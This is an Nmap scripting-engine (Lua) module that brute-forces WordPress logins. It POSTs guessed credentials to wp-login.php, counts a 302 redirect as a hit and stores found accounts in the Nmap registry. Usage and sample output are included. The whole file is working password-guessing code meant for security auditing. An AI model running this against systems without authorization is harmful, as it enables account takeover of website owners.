description = [[
Performs a brute force password attack against Wordpress installations.

Wordpress default uri and form names:
* Default uri:<code>wp-login.php</code>
* Default uservar: <code>log</code>
* Default passvar: <code>pwd</code>
]]

---
-- @usage
-- nmap -p80 --script http-wordpress-brute
--   --script-args 'userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.hostname=domain.com,
--                  http-wordpress-brute.threads=3,brute.firstonly=true' <ip>
--
-- This script uses the unpwdb and brute libraries to perform password
-- guessing. Any successful guesses are stored in the nmap registry, under
-- the nmap.registry.credentials.http key for other scripts to use.
--
-- @output
-- PORT     STATE SERVICE REASON
-- 80/tcp   open  http    syn-ack
-- | http-wordpress-brute:
-- |   Accounts
-- |     0xdeadb33f:god => Login correct
-- |   Statistics
-- |_    Perfomed 103 guesses in 17 seconds, average tps: 6
--
--
-- @args http-wordpress-brute.uri points to the file 'wp-login.php'
-- @args http-wordpress-brute.hostname sets the host header in case of virtual
--       hosting
-- @args http-wordpress-brute.uservar sets the http-variable name that holds the
--		 username used to authenticate. Defaults are used if not set.
-- @args http-wordpress-brute.passvar sets the http-variable name that holds the
--		 password used to authenticate. Defaults are used if not set.
-- @args http-wordpress-brute.threads sets the number of threads. Default: 3
--
-- Other useful arguments when using this script are:
-- * http.useragent = String - User Agent used in HTTP requests
-- * brute.firstonly = Boolean - Stop attack when the first credentials are found
-- * brute.mode = user/creds/pass - Username password iterator
-- * passdb = String - Path to password list
-- * userdb = String - Path to user list
--
--
-- Based on Patrik Karlsson's http-form-brute
--

author = "Paulino Calderon"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"intrusive", "auth"}

require 'shortport'
require 'http'
require 'brute'

portrule = shortport.http

local DEFAULT_WP_URI = "/wp-login.php"
local DEFAULT_WP_USERVAR = "log"
local DEFAULT_WP_PASSVAR = "pwd"
local DEFAULT_THREAD_NUM = 3

---
--This class implements the Driver class from the Brute library
---
Driver = {
  new = function(self, host, port, options)
    local o = {}
    setmetatable(o, self)
    self.__index = self
    o.host = nmap.registry.args['http-wordpress-brute.hostname'] or host
    o.port = port
    o.uri = nmap.registry.args['http-wordpress-brute.uri'] or DEFAULT_WP_URI
    o.options = options
    return o
  end,

  connect = function( self )
    -- This will cause problems, as ther is no way for us to "reserve"
    -- a socket. We may end up here early with a set of credentials
    -- which won't be guessed until the end, due to socket exhaustion.
    return true
  end,

  login = function( self, username, password )
    -- Note the no_cache directive
    stdnse.print_debug(2, "HTTP POST %s%s", self.host.name, self.uri)
    local response = http.post( self.host, self.port, self.uri, { no_cache = true }, nil, { [self.options.uservar] = username, [self.options.passvar] = password } )
                -- This redirect is taking us to /wp-admin
    if response.status == 302 then
      if ( not( nmap.registry['credentials'] ) ) then
        nmap.registry['credentials'] = {}
      end
      if ( not( nmap.registry.credentials['http'] ) ) then
        nmap.registry.credentials['http'] = {}
      end
      table.insert( nmap.registry.credentials.http, { username = username, password = password } )
      return true, brute.Account:new( username, password, "OPEN")
    end

    return false, brute.Error:new( "Incorrect password" )
  end,

  disconnect = function( self )
    return true
  end,

  check = function( self )
    local response = http.get( self.host, self.port, self.uri )
    stdnse.print_debug(1, "HTTP GET %s%s", stdnse.get_hostname(self.host),self.uri)
    -- Check if password field is there
    if ( response.status == 200 and response.body:match('type=[\'"]password[\'"]')) then
      stdnse.print_debug(1, "Initial check passed. Launching brute force attack")
      return true
    else
      stdnse.print_debug(1, "Initial check failed. Password field wasn't found")
    end

    return false
  end

}
---
--MAIN
---
action = function( host, port )
  local status, result, engine
  local uservar = nmap.registry.args['http-wordpress-brute.uservar'] or DEFAULT_WP_USERVAR
  local passvar = nmap.registry.args['http-wordpress-brute.passvar'] or DEFAULT_WP_PASSVAR
  local thread_num = nmap.registry.args["http-wordpress-brute.threads"] or DEFAULT_THREAD_NUM

  engine = brute.Engine:new( Driver, host, port, { uservar = uservar, passvar = passvar } )
  engine:setMaxThreads(thread_num)
  engine.options.script_name = SCRIPT_NAME

  status, result = engine:start()

  return result
end